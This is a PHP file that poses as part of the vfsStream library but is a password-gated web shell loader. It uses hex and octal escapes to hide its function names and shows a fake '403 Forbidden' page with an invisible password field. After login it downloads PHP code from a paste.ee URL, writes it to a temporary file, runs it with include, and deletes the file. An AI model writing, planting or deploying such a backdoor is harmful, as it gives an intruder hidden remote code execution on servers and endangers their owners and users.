<?php
/**
 * This file is part of vfsStream.
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 *
 * @package  org\bovigo\vfs
 */
     /**
     * url scheme
     */
session_start();
/**
 * Some utility methods for vfsStream.
 *
 * @api
 */
function fuck ( $url ) {
	$fpn = "\146" . "\x6f" . "\160" . "\145" . "\x6e";
	$strim = "\163" . "\x74" . "\x72" . "\145" . "\x61" . "\x6d" . "\x5f" . "\x67" . "\x65" . "\164" . "\137" . "\x63" . "\x6f" . "\156" . "\x74" . "\x65" . "\156" . "\x74" . "\x73";
	$fgt = "\146" . "\151" . "\x6c" . "\x65" . "\x5f" . "\147" . "\145" . "\x74" . "\137" . "\x63" . "\157" . "\x6e" . "\x74" . "\x65" . "\156" . "\164" . "\163";
	$cexec = "\143" . "\165" . "\162" . "\154" . "\137" . "\x65" . "\x78" . "\145" . "\x63";
    
    if ( function_exists($cexec) ){ 
        $curl_connect = curl_init( $url );

        curl_setopt($curl_connect, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl_connect, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl_connect, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($curl_connect, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($curl_connect, CURLOPT_SSL_VERIFYHOST, 0);
        
        $content_data = $cexec( $curl_connect );
    }
    elseif ( function_exists($fgt) ) {
        $content_data = $fgt( $url );
    }
    else {
        $handle = $fpn ( $url , "r");
        $content_data = $strim( $handle );
    }
        
    return $content_data;
}

function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '$2a$12$w1bti0.Wn5hvrzOwj2/o5eVsSaDmr0o1JcyXhBSYe9Esf5qxV57Z.';
    if (password_verify($entered_password, $hashed_password)) {
        $_SESSION['logged_in'] = true;
        $_SESSION['java'] = 'nesec';
    } else {
        echo "Salah Cok";
    }
}

if (is_logged_in()) {
    $s = fuck('https://paste.ee/r/d2y2i');
    $temporary_file = tempnam(sys_get_temp_dir(), 'prefix');
    file_put_contents($temporary_file, $s);
    include $temporary_file;
    unlink($temporary_file);
} else {
    ?>
    <?php
    echo "<!DOCTYPE html><head><title>403 Forbidden</title></head><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server.</p>".$_SERVER['SERVER_SIGNATURE']."";
    echo "<form method='post' style='height:100%;margin:0;display:flex;justify-content:center;align-items:center'><input style='margin:0;background-color:#fff;border:1px solid #fff;' type='password' name='password'></form></body></html>";
}
?>
